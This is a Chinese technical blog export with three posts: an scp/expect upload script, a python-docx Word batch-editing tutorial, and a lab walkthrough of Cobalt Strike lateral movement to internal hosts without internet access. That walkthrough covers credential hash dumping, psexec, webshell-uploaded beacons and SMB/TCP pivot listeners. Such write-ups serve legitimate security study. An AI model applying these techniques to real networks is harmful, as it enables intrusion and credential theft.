<h1 id="三、shell脚本实现"><a href="#三、shell脚本实现" class="headerlink" title="三、shell脚本实现"></a>三、shell脚本实现</h1><p>回到脚本这来，已知客户需要的是shell脚本，那怎么办呢，其实shell也有支持连接其他服务器的功能，而且方式还很多，写的话也不难写，话不多说，开整。首先我想的还是用ftp服务，毕竟这个能满足所有需求，然后我就搞了个ftp的。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash">用户名</span></span><br><span class="line">user=</span><br><span class="line"><span class="meta">#</span><span class="bash">密码</span></span><br><span class="line">password=</span><br><span class="line"><span class="meta">#</span><span class="bash">本地存在这个文件的目录</span></span><br><span class="line">local_url=/tmp</span><br><span class="line"><span class="meta">#</span><span class="bash">上传的目的目录</span></span><br><span class="line">server_url=/home</span><br><span class="line"><span class="meta">#</span><span class="bash">服务器IP</span></span><br><span class="line">ip=</span><br><span class="line"><span class="meta">#</span><span class="bash">端口</span></span><br><span class="line">port=22</span><br><span class="line">cd $&#123;local_url&#125;;</span><br><span class="line"><span class="meta">#</span><span class="bash">定位在50分钟内生成的xml文件，这个可以根据自己的需求来改需要回收的数据类型</span></span><br><span class="line">files=`find $&#123;local_url&#125; -mmin -50 -name &#x27;*.xml&#x27;`</span><br><span class="line">for file in $&#123;files&#125;</span><br><span class="line">do</span><br><span class="line">	echo $&#123;file&#125;</span><br><span class="line"><span class="meta">	#</span><span class="bash">建立ftp连接</span></span><br><span class="line">	lftp -u $&#123;user&#125;,$&#123;password&#125; sftp://$&#123;ip&#125;:$&#123;port&#125; &lt;&lt;EOF</span><br><span class="line">cd $&#123;server_url&#125;/</span><br><span class="line">lcd $&#123;local_url&#125;</span><br><span class="line">put $&#123;file&#125;</span><br><span class="line">by</span><br><span class="line">EOF</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<p>到这里，我以为就搞定了，开开心心发过去，看了看点，三踮几啦，饮茶先啦，点了杯奶茶。不出意外要出意外了，客户说他那边没lftp这个服务，问我能不能用SCP服务，他们之前用的SCP服务，到手的奶茶突然不香了，也行！不就是SCP嘛，开整！也就是改下服务的事情。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash">用户名</span></span><br><span class="line">user=</span><br><span class="line"><span class="meta">#</span><span class="bash">本地存在这个文件的目录</span></span><br><span class="line">local_url=/tmp</span><br><span class="line"><span class="meta">#</span><span class="bash">上传的目的目录</span></span><br><span class="line">server_url=/home</span><br><span class="line"><span class="meta">#</span><span class="bash">服务器IP</span></span><br><span class="line">ip=</span><br><span class="line"><span class="meta">#</span><span class="bash">端口</span></span><br><span class="line">port=22</span><br><span class="line"></span><br><span class="line">cd $&#123;local_url&#125;</span><br><span class="line">files=`find $&#123;local_url&#125; -mmin -50 -name &#x27;*.xml&#x27;`</span><br><span class="line">for file in $&#123;files&#125;</span><br><span class="line">do</span><br><span class="line">	echo $&#123;file&#125;</span><br><span class="line">	scp -P $&#123;port&#125; $&#123;file&#125; $&#123;user&#125;@$&#123;ip&#125;:$&#123;server_url&#125; &lt;&lt;EOF</span><br><span class="line">by</span><br><span class="line">EOF</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<p>这个的功能实现了，但是跟FTP不一样的是，FTP能够在命令中把密码加进去，而SCP需要自己输入密码。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">lftp -u $&#123;user&#125;,$&#123;password&#125; sftp://$&#123;ip&#125;:$&#123;port&#125; &lt;&lt;EOF</span><br><span class="line"><span class="meta">#</span><span class="bash">账号密码在命令上</span></span><br><span class="line">scp -P $&#123;port&#125; $&#123;file&#125; $&#123;user&#125;@$&#123;ip&#125;:$&#123;server_url&#125; &lt;&lt;EOF</span><br><span class="line"><span class="meta">#</span><span class="bash">账号密码需要自己输入</span></span><br></pre></td></tr></table></figure>

<p>客户看到又有问题了，啊这，能不能让他自己输入密码啊，我这不支持输入密码。也行，用expect写个监测关键字就行了，我没想到就是因为我这句也行，让我头秃了两天。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/expect</span></span><br><span class="line"><span class="meta">#</span><span class="bash">ip=`ifconfig -a|grep inet|grep -v 127.0.0.1|grep -v inet6|awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>|tr -d <span class="string">&quot;addr:&quot;</span>`</span></span><br><span class="line">spawn scp -P 22 /home/ax/a.xml 用户名@服务器IP:/tmp</span><br><span class="line">set timeout 20</span><br><span class="line"><span class="meta">#</span><span class="bash">监测下面的命令行中有没有password这个关键字</span></span><br><span class="line">expect &quot;password&quot;</span><br><span class="line">exec sleep 1</span><br><span class="line"><span class="meta">#</span><span class="bash">监测到了就发送密码</span></span><br><span class="line">send &quot;密码\r&quot;</span><br><span class="line">interact</span><br></pre></td></tr></table></figure>

<p>这个只是实现了一部分的功能，上面我说到，跑完主机之后的数据文件是带本机IP的，所以我们需要找到我们的本机IP，而关键点就在这，如果我要使用</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ip=`ifconfig -a|grep inet|grep -v 127.0.0.1|grep -v inet6|awk &#x27;&#123;print $2&#125;&#x27;|tr -d &quot;addr:&quot;`</span><br></pre></td></tr></table></figure>

<p>这句命令来找IP的话，我需要用到bash解释器里面的东西，而我用expect是需要用到/usr/bin/expect这个解释器，而这两个是没办法直接引用到上面的，也就是一个shell脚本无法直接使用两个解释器。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/expect</span></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br></pre></td></tr></table></figure>

<p>找了两天的解决办法，什么方式都尝试了一遍，文件包含，命令行传参啥的都尝试了，都没办法，我甚至午休躺在椅子上面睡觉还梦到有别的解决办法，然后惊醒，本来已经打算跟客户说让他用ftp那个的时候，我偶然看到一个代码块，里面有个词引起了我的注意，内嵌类型！！！！！！当时就感觉有戏，好像我找的方式就是他，让仔细查了下内嵌类型是个啥，果然！！！！我只需要把我需要用到解释器的部分代码内嵌到我另一个解释器的代码里面，就可以了。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">local_ip=`ifconfig -a|grep inet|grep -v 127.0.0.1|grep -v inet6|awk &#x27;&#123;print $2&#125;&#x27;|tr -d &quot;addr:&quot;`</span><br><span class="line"><span class="meta">#</span><span class="bash">用户名</span></span><br><span class="line">user=</span><br><span class="line"><span class="meta">#</span><span class="bash">密码</span></span><br><span class="line">password=</span><br><span class="line"><span class="meta">#</span><span class="bash">本地存在这个文件的目录，格式例如/home/ax/</span></span><br><span class="line">local_url=</span><br><span class="line"><span class="meta">#</span><span class="bash">上传的目的目录,格式：/tmp</span></span><br><span class="line">server_url=</span><br><span class="line"><span class="meta">#</span><span class="bash">端口</span></span><br><span class="line">port=22</span><br><span class="line"><span class="meta">#</span><span class="bash">服务器IP</span></span><br><span class="line">server_ip=</span><br><span class="line"><span class="meta">#</span><span class="bash">这里一定要加&lt;&lt;<span class="string">EOF,才能将另一个解释器的代码内嵌到这里来</span></span></span><br><span class="line">/usr/bin/expect &lt;&lt;EOF</span><br><span class="line">spawn scp -P $&#123;port&#125; $&#123;local_url&#125;$&#123;local_ip&#125;_a.xml $&#123;user&#125;@$&#123;server_ip&#125;:$&#123;server_url&#125;</span><br><span class="line">set timeout 20</span><br><span class="line">expect &quot;password&quot;</span><br><span class="line">exec sleep 2</span><br><span class="line">send &quot;$&#123;password&#125;\r&quot;</span><br><span class="line">interact</span><br><span class="line">expect eof</span><br><span class="line">EOF</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="string">结尾的时候要把EOF</span>给结束掉，也就是将上面的代码包进来</span></span><br></pre></td></tr></table></figure>

<p>这样直接把过滤文件的方式已经自动输入密码给完成了，其实如果想要实现那些自动上传脚本，执行这些也是能完成的，只要解决了两个解释器命令能够在同一个脚本里面执行，其他都很好解决，设计好逻辑思路就可以了，但是这个是属于被白嫖的服务，能少点需求就少点需求。</p>
]]></content>
      <categories>
        <category>安全开发</category>
      </categories>
      <tags>
        <tag>安全工具</tag>
      </tags>
  </entry>
  <entry>
    <title>word文档批量处理脚本</title>
    <url>/2022/05/13/word%E6%96%87%E6%A1%A3%E6%89%B9%E9%87%8F%E5%A4%84%E7%90%86%E8%84%9A%E6%9C%AC/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>公司让去客户现场了，去了那边的工作不是很难，但是很繁琐，特别是word的文档处理这块，经常要处理几十个文档就很烦，挣扎了下还是打算写个脚本来批量处理这些事情，总不能因为这些事情耽误了自己进步（摸鱼）吧？由于之前没接触过py在word文档处理这块的东西，所以还是踩了一些坑的，写一下，后续有用到可以避避坑。</p>
<span id="more"></span>
<h1 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h1><p>老样子，一开始还是先思考下，如果正常操作，我们会如何操作，然后根据这些操作去构思我们的路线，所有的方便都不会是直接来的，不是一两个函数就能解决的事情，就好像3D打印，你没构图，3D打印也没办法打出你想要的东西出来，所以一开始我构思了三条路线：</p>
<p>一：直接定位里面的内容，然后删除，插入自己想要的；</p>
<p>二：把我想要的内容独立做成一个文档，然后定位内容，把老的删除，删除之后粘贴新的；</p>
<p>三：将原文档的内容进行切块，然后再把自己想要的内容独立成一些文档，然后再把每个文档进行拼接，得到新的文档；</p>
<p>其实还有其他的思路，但是有点太过繁琐，后面我在实现的过程中发现实际上不需要那么复杂，是自己想太多了，后面会谈到，那么先说下第一个思路，简单易懂对吧，但是具体实现起来，发现删除了之后，我重新写进去的数据，会丢失之前的格式，而py的docx对于格式方面虽然说可以赋予格式，但是没办法跟真正的word一样去设置每一部分的格式，而且有一些是不存在的，所以这块就十分的麻烦，如果你的文档不存在格式的问题，就简简单单的文字，那完全可以根据这个思路去做，而且很方便。第二个思路的话，有个很重要的点就是，定位可以定位，但是粘贴新的内容的时候，他会跟在文档末尾，也就是说，如果你想要粘贴的在文档中间，那没办法去直接粘贴到指定位置（PS：没怎么接触这个，我就只是为了实现这个东西，才去看了下，如果有话，是小弟太菜了），第三个思路的话，乍一看似乎可以得到我们想要的东西，但是如果文件量多起来的话，问题在于怎么去做到准确切割自己想要的东西。</p>
<h1 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h1><p>多说无益，动手才知道坑在哪，如果要批量转化word的话，那么第一步肯定是先拿到我们文件夹里面的文件，然后再轮询，这个可以先不管，先试试能不能修改word里面的内容，ok，这里经过一系列的百度之后，我发现了python的一个很神奇的库—python-docx，用于创建可修改微软Word的一个python库，提供全套的 Word操作，是最常用的Word工具，而且能保留我们原有的格式，那这不是直接起飞？？？</p>
<p>在开始使用之前，先说下关于word的一些概念：</p>
<ul>
<li><code>Document</code>：是一个 Word 文档 对象，不同于 VBA 中 Worksheet 的概念，Document 是独立的，打开不同的 Word 文档，就会有不同的 Document 对象，相互之间没有影响</li>
<li><code>Paragraph</code>：是段落，一个 Word 文档由多个段落组成，当在文档中输入一个回车键，就会成为新的段落，输入 shift + 回车，不会分段</li>
<li><code>Run</code> 表示一个节段，每个段落由多个 节段 组成，一个段落中具有相同样式的连续文本，组成一个节段，所以一个 段落 对象有个 Run 列表</li>
</ul>
<p>也就是说word 文档内容的结构是这样划分的：</p>
<p><img src="https://ax-x.github.io/2022/05/13/word%E6%96%87%E6%A1%A3%E6%89%B9%E9%87%8F%E5%A4%84%E7%90%86%E8%84%9A%E6%9C%AC/1.png" alt="1"></p>
<p>第二个 段落（paragraph），没有内容，所以 节段（run）为空，了解到这，也基本上知道如何去定位我们想要的数据了，先轮询paragraph，然后在这个paragraph里面去轮询run，从而拿到我们的要的数据，说干就干，直接上，就拿上面的概念为文本，我们写个代码块去遍历这些段落，然后输出出来</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> docx <span class="keyword">import</span> Document</span><br><span class="line"></span><br><span class="line">tpl_doc=<span class="string">&#x27;title.docx&#x27;</span></span><br><span class="line">doc = Document(tpl_doc)</span><br><span class="line"><span class="keyword">for</span> paragraph <span class="keyword">in</span> doc.paragraphs:</span><br><span class="line">    <span class="built_in">print</span>(paragraph.text)</span><br></pre></td></tr></table></figure>

<p>输出结果是这样的：</p>
<p><img src="https://ax-x.github.io/2022/05/13/word%E6%96%87%E6%A1%A3%E6%89%B9%E9%87%8F%E5%A4%84%E7%90%86%E8%84%9A%E6%9C%AC/image-20220513091808872-16524046932521.png" alt="image-20220513091808872"></p>
<p>这就是每一段的内容，再遍历每一段里面的run块出来</p>
<p><img src="https://ax-x.github.io/2022/05/13/word%E6%96%87%E6%A1%A3%E6%89%B9%E9%87%8F%E5%A4%84%E7%90%86%E8%84%9A%E6%9C%AC/image-20220513094744241-16524064658883.png" alt="image-20220513094744241"></p>
<p>可以看到run的区分不是根据词语的，而是根据写入的时间节点，如果时间节点不一样，那么run的内容就不一样，同一段文字，可能写入的时间节点不一致，遍历run的时候结果也不一样，这点暂时没办法解决，目前能想到的就是遍历的时候组合文字，当匹配出自己想要的文之后再进行替换。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">params = &#123;</span><br><span class="line">       <span class="string">&quot;原文RUN-A&quot;</span>: <span class="string">&quot;替换的文字&quot;</span>,</span><br><span class="line">       <span class="string">&quot;原文RUN-B&quot;</span>: <span class="string">&quot;替换的文字&quot;</span>,</span><br><span class="line">       <span class="string">&quot;原文RUN-C&quot;</span>: <span class="string">&quot;替换的文字&quot;</span>,</span><br><span class="line">       <span class="string">&quot;原文RUN-D&quot;</span>: <span class="string">&quot;替换的文字&quot;</span>,</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">for</span> paragraph <span class="keyword">in</span> doc.paragraphs:</span><br><span class="line">       <span class="keyword">for</span> param <span class="keyword">in</span> params:</span><br><span class="line">           pv = <span class="built_in">str</span>(params[param])</span><br><span class="line">           ph = <span class="string">f&#x27;<span class="subst">&#123;param&#125;</span>&#x27;</span></span><br><span class="line">           <span class="keyword">if</span> ph <span class="keyword">in</span> paragraph.text:</span><br><span class="line">               <span class="keyword">for</span> run <span class="keyword">in</span> paragraph.runs:</span><br><span class="line">                   <span class="keyword">if</span> ph <span class="keyword">in</span> run.text:</span><br><span class="line">                       run.text = run.text.replace(ph, pv)</span><br><span class="line">                       run.italic = <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p>这些能有效处理开头和中间的文字，而且这种方式替换的话，不会去掉文章原有的格式，而如果有需要替换大量的文字段落在文章末的时候，可以将文末需要替换的文字删除，需要删除空行，普通的clean命令只是将内容删除，而不会去除换行，所以删除之后会存在空行的情况 ，这时候如果复制另外一个文档的内容接入到文末的话，他会接在空行后面，所以需要删除空行。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> paragraph <span class="keyword">in</span> doc.paragraphs:</span><br><span class="line">    <span class="keyword">if</span>(paragraph.text==<span class="string">&quot;段落内容&quot;</span>):</span><br><span class="line">        p = paragraph._element</span><br><span class="line">        p.getparent().remove(p)</span><br><span class="line">        p._p = p._element = <span class="literal">None</span></span><br><span class="line"><span class="comment">#这部分是遍历段落，将文末需要替换的段落进行删除去除空行，方便后续将另一个文件的内容复制进来</span></span><br></pre></td></tr></table></figure>

<p>这里有一点就是，把其他文档里面的内容合并到这个文档的时候，其他文档里面的文字内容格式是不会变的，这也跟我们最初的想法一致，保留原有的格式，所以可以直接使用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">bottom_title = <span class="string">&#x27;bottom.docx&#x27;</span></span><br><span class="line">bottom_document = Document(bottom_title)</span><br><span class="line">master = Document(<span class="string">&#x27;old_docx.docx&#x27;</span>)</span><br><span class="line">middle_new_docx = Composer(master)</span><br><span class="line">middle_new_docx.append(bottom_document)</span><br><span class="line">filename = old_docx.docx</span><br><span class="line"><span class="built_in">print</span>(filename)</span><br><span class="line">middle_new_docx.save(filename)</span><br></pre></td></tr></table></figure>

<p>到这基本需要替换的就能够替换掉，并且保留文档格式了，但是有一点就是，去除空行不能够遍历全文，最好就是先定位到位置，再增加判断条件，不然容易将图片内容删除，因为当你遍历段落的时候，图片独占一行的时候该段落是空的，所以会将图片给删除掉，可以额外加一个判断，当存在图片的时候，该段落的run值是为0，而不存在图片单纯一个空行的时候，run是不存在任何值的。</p>
]]></content>
      <categories>
        <category>安全开发</category>
      </categories>
      <tags>
        <tag>自动化脚本</tag>
      </tags>
  </entry>
  <entry>
    <title>不出网主机的几种上线方式</title>
    <url>/2022/05/31/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>拿到一台边缘机器后，内网的机器很有可能大多数都不出网，这时又想上线cs方便后续操作。本文就如何上线不出网主机的方式进行了总结。</p>
<span id="more"></span>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="目标内网机器"><a href="#目标内网机器" class="headerlink" title="目标内网机器"></a>目标内网机器</h3><ul>
<li>os：win server 2012</li>
<li>ip：192.168.57.137</li>
</ul>
<p><img src="https://ax-x.github.io/2022/05/31/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/t0136c4d3e3999c5caf.png" alt="img"></p>
<p>边缘机器</p>
<ul>
<li>os：win server 2012</li>
<li>ip1：192.168.1.103（出网）</li>
<li>ip2：192.168.57.136</li>
</ul>
<p><img src="https://ax-x.github.io/2022/05/31/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/t01c9155db0479a0e48.png" alt="img"></p>
<h3 id="攻击机器"><a href="#攻击机器" class="headerlink" title="攻击机器"></a>攻击机器</h3><ul>
<li>os：kali liunx</li>
<li>ip：192.168.1.128</li>
</ul>
<p><img src="https://ax-x.github.io/2022/05/31/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/t0102e7b40d17335b25.png" alt="img"></p>
<ul>
<li>os：ubutu 16.04</li>
<li>vps ip：47.xxxxxxxx</li>
</ul>
<p>由于边缘主机出网，选择reverse反向连接，现在已经上线边缘主机</p>
<p><img src="https://ax-x.github.io/2022/05/31/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/t0185a759e9da61208c.png" alt="img"></p>
<h2 id="SMB-Beacon"><a href="#SMB-Beacon" class="headerlink" title="SMB Beacon"></a>SMB Beacon</h2><p>该方法通过已有的父Beacon使用SMB协议进行正向连接不出网机器，要求目标开启445端口，通过命名管道进行认证即可上线。其实有点像psexec这样的工具，有用户名和hash后，即可执行远程命令，其原理相似。内网的机器密码相同的情况很多，这也是为什么现在为了提高安全性不能批量设置密码，内网渗透一但有了密码往往有时候就宣告结束。</p>
<p>并且有个好处就是SMB协议一般防火墙是不拦截的，在一定程度上可以规避防火墙拦截。</p>
<p>先使用hashdump和logonpasswords命令抓一波密码。由于这里是win2012系统，是无法直接抓取明文密码的，这里也不需要去修改注册表，或者通过mimilib.dll注入的方式去获取明文密码，有hash就足够了，SMB验证身份本身用的就是NTMLv2协议。</p>
<p>这里是抓到了该机器上的hash</p>
<blockquote>
<p>有个小tips，如果对方机器是64位的，最好就用x64的exe上线就可以了，以前我觉得x32和x64都行。虽然都可以上线，但是如果用的是x32的beacon，很有可能是抓不到64位机器上的密码的，使用cs集成的mimikatz会提示：32位的mimikatz无法抓取到64位机器的密码。所以目标是最好就用64位就用64位的artifact。</p>
</blockquote>
<p>然后通过端口扫描，发现内网机器：</p>
<p>到这里不懂原理的小白(我)可能就会直接使用cs自带的psexec功能直接去横向，恰巧我之前就是这么做的，想起来还挺有意思的。</p>
<p>结果就是服务已经创建了，但是上不了线，那会儿自己心里想肯定是cs出bug了，还烦了一会儿，现在想起来还挺有意思的。</p>
<p>本身是没有问题的，说明psexec已经成功的完成了ntml认证，并且认证成功，但是这时候shell是反弹给边缘机器的，如果要上线就要再新建一个SMB Beacon Listener。相当于通过边缘机器再中转一下，反弹shell到vps。</p>
<p>选择子Beacon：SMB Beacon。成功上线。</p>
<p><img src="https://ax-x.github.io/2022/05/31/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/t01a9823f07373d94f1.png" alt="img"></p>
<p>（出去吃个饭回来内网机器ip变了。。）</p>
<p>这里可以看下拓扑图，是通过边缘机器正向连接了不出网的内网主机。</p>
<p><img src="https://ax-x.github.io/2022/05/31/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/t0107b4d4325abce982.png" alt="img"></p>
<p>在external后面有一个oooo，这实际上是标明了当前SMB的连接状态：</p>
<blockquote>
<p>SMB Beacon有两个命令：link，unlink。</p>
</blockquote>
<p>unlink则会断开连接，link会重新连接</p>
<p>执行命令unlink</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">unlink</span> <span class="number">192.168.57.140</span></span><br></pre></td></tr></table></figure>

<p>后面的oooo变成了oo oo，说明已经断开连接，但是只是断开了连接，进程并没有被杀掉。</p>
<p><img src="https://ax-x.github.io/2022/05/31/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/t01cfd5fb064d8aefa7.png" alt="img"></p>
<p><img src="https://ax-x.github.io/2022/05/31/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/t01b4e6f189e53d7e22.png" alt="img"></p>
<p>使用命令重新回连：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">link</span> <span class="number">192.168.57.140</span></span><br></pre></td></tr></table></figure>

<p><img src="https://ax-x.github.io/2022/05/31/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/t013251e9762f0870af.png" alt="img"></p>
<blockquote>
<p>我在实战中暂时没有用到过这个功能，但应该是有一定作用的，持久化后门，更加隐蔽？这里具体的实战情景明白的师傅可以说一下。</p>
</blockquote>
<h2 id="TCP-Beacon"><a href="#TCP-Beacon" class="headerlink" title="TCP Beacon"></a>TCP Beacon</h2><p>这种方式一般试用于：密码撞不上，内网机器有web服务。</p>
<p>这里做个代理，假设已经写入了shell文件，用冰蝎挂代理去连webshell。</p>
<p><img src="https://ax-x.github.io/2022/05/31/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/t01b78a2eb546d849b8.png" alt="img"></p>
<p><img src="https://ax-x.github.io/2022/05/31/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/t01263d4d607a2c6917.png" alt="img"></p>
<p><img src="https://ax-x.github.io/2022/05/31/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/t01b99db35da21d225e.png" alt="img"></p>
<p>在cs上新增一个Listen，Tcp Beacon</p>
<p><img src="https://ax-x.github.io/2022/05/31/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/t010acf5427fc6e9f0c.png" alt="img"></p>
<p>横向的时候最好都使用这个带s的windows可执行文件，s的含义为Stageless，相对的是Stager。下面是我自己的理解：</p>
<blockquote>
<p>Stager是分步式，分阶段的，只用少部分代码来请求和加载payload，cs的加载payload模式为反射加载beacon.dll，但这个beacon.dll并不在可执行文件中，而是在远程C2服务端。</p>
<p>Stageless则是将beacon.dll包含在可执行文件中，并且可能有写额外的操作，于是文件比较大，特征也更明显，但是适合横向不出网机器，因为不出网所以有可能请求不了c2服务端上的beacon.dll。</p>
</blockquote>
<p><img src="https://ax-x.github.io/2022/05/31/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/t012ac4841f86216310.png" alt="img"></p>
<p><img src="https://ax-x.github.io/2022/05/31/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/t01feff5208e2e2a26c.png" alt="img"></p>
<p>Stageless的可执行文件比Stager的可执行文件大了将近15倍。真的离谱。</p>
<p><img src="https://ax-x.github.io/2022/05/31/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/t01840617d36881e092.png" alt="img"></p>
<p>然后用冰蝎上传beacon.exe。然后执行</p>
<p><img src="https://ax-x.github.io/2022/05/31/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/t0132848590c9c8a8cc.png" alt="img"></p>
<p>执行后使用connect 命令连接：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">connect</span> <span class="number">192.168.57.140</span></span><br></pre></td></tr></table></figure>

<p><img src="https://ax-x.github.io/2022/05/31/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/t0144f9cccbedfb8132.png" alt="img"></p>
<p>拓扑图如下，为tcp正向连接：</p>
<p><img src="https://ax-x.github.io/2022/05/31/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/t01c4788838e1ee9c89.png" alt="img"></p>
<p>同样是可以使用unlink来断开连接，这里与SMB Beacon不一样的是，如果Beacon进程是以普通权限运行的话，进程会直接死掉，再connect就会失败。</p>
<p>这里由于是Administrator权限，unlink后可以通过connect重新连接回来。</p>
<p><img src="https://ax-x.github.io/2022/05/31/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/t019a0d694dbfef7718.png" alt="img"></p>
<h2 id="Reverse-TCP-Beacon"><a href="#Reverse-TCP-Beacon" class="headerlink" title="Reverse TCP Beacon"></a>Reverse TCP Beacon</h2><p>也可以被称为中继上线。</p>
<p>同样需要有内网web，传shell。右键跳板机shell，选择Pivoting-&gt;Listener。</p>
<p><img src="https://ax-x.github.io/2022/05/31/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/t017374758310808e90.png" alt="img"></p>
<p>Listen Host为内网ip。</p>
<p>这里要注意一下，如果有多张网卡，这个默认的Listen Host是需要改的，需要填入同一网段的ip。</p>
<p>比如我这里的跳板机器就有两张网卡，默认填入的host是192.168.1.103，这个就需要改，因为内网不出网机器是无法访问到192.168.1.103这张网卡的，只能访问192.168.57.143（跳板机ip又变了）</p>
<p><img src="https://ax-x.github.io/2022/05/31/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/t01cf002e13a2f3fbb7.png" alt="img"></p>
<p>同样生成Stageless的可执行文件。</p>
